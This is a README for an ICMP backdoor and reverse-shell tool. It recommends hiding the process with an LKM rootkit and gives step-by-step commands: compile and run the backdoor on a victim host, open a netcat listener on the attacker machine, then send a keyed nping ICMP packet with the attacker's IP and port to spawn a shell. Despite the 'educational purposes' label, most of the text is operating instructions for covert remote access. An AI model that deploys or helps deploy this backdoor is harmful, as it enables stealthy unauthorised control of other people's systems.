# ICMP Backdoor
A cool ICMP listener and reverse shell. Ideally, should be used in conjunction with a LKM rootkit like [Diamorphine](https://github.com/m0nad/Diamorphine) to hide the process. Hypothetically, this could be turned into shellcode and injected into processes with `ptrace`, but I wouldn't recommend it since this implementation isn't really minimal.

*for educational purposes!*

# Usage
On the host machine, compile and run:
```
$ make
$ ./backdoor
```
You can also ensure:
```
$ ./backdoor -v
Secret Key:		wA@2mC!dq
Service Name:	        backdoor
Shell Path:		/bin/bash
```
On the attacker machine start a netcat listener:
```
$ nc -lnvp <port>
```
And send an ICMP packet to the victim:
```
$ nping --icmp -c 1 -dest-ip <victim-ip> --data-string 'wA@2mC!dq <attacker-ip> <port>'
```
